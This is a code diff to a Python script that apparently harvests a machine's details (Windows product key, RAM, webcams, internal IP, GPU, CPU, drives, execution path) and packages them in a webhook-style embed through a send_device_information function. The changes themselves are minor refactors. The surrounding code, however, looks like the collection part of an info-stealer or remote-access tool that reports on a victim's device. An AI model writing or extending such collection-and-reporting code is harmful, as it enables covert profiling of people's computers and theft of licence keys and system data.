@@ -1,6 +1,6 @@
 import os
+import wmi
 import subprocess
-import cpuinfo
 import GPUtil
 import sys
 import psutil
@@ -67,7 +67,7 @@ system = str(subprocess.check_output('wmic os get Caption /format:list').decode(
 output = subprocess.check_output('wmic path softwarelicensingservice get OA3xOriginalProductKey', shell=True).decode().strip()
 product_key = str(output.split('\n', 1)[-1].strip())
 ram = str(round(psutil.virtual_memory().total / (1024.0 **3)))+" GB"
-power = str(psutil.sensors_battery().percent) if psutil.sensors_battery() is not None else "No battery"
+power = str(psutil.sensors_battery().percent) + "%" if psutil.sensors_battery() is not None else "No battery"
 screen = str(pyautogui.size())
 webcams_count = len(pygame.camera.list_cameras())
 internal_ip = str(socket.gethostbyname(socket.gethostname()))
@@ -76,8 +76,8 @@ gpus = GPUtil.getGPUs()
 gpu_info = str("")
 for gpu in gpus:
     gpu_info += f"GPU Name: {gpu.name} - GPU Driver: {gpu.driver} - GPU Memory Total: {gpu.memoryTotal}MB - GPU Memory Free: {gpu.memoryFree}MB - GPU Memory Used: {gpu.memoryUsed}MB"
-info = cpuinfo.get_cpu_info()
-cpu_info = str(f"CPU Name: {info['brand_raw']} - CPU Architecture: {info['arch']} - CPU Cores: {info['count']}")
+info = wmi.WMI().Win32_Processor()[0]
+cpu_info = str(f"Name: {str(info.Name)} - Arch: x{info.AddressWidth} - Cores: {info.NumberOfCores}")
 current_execution_path = str(os.path.join(os.getcwd(), sys.argv[0]))
 drives = get_drive_info()
 drive_info_string = str(format_drive_info(drives))
@@ -159,7 +159,7 @@ def send_device_information():
             {
                 "name": "Power",
                 "value":
-                    f"`{power}%`",
+                    f"`{power}`",
                 "inline": False,
             },
             {
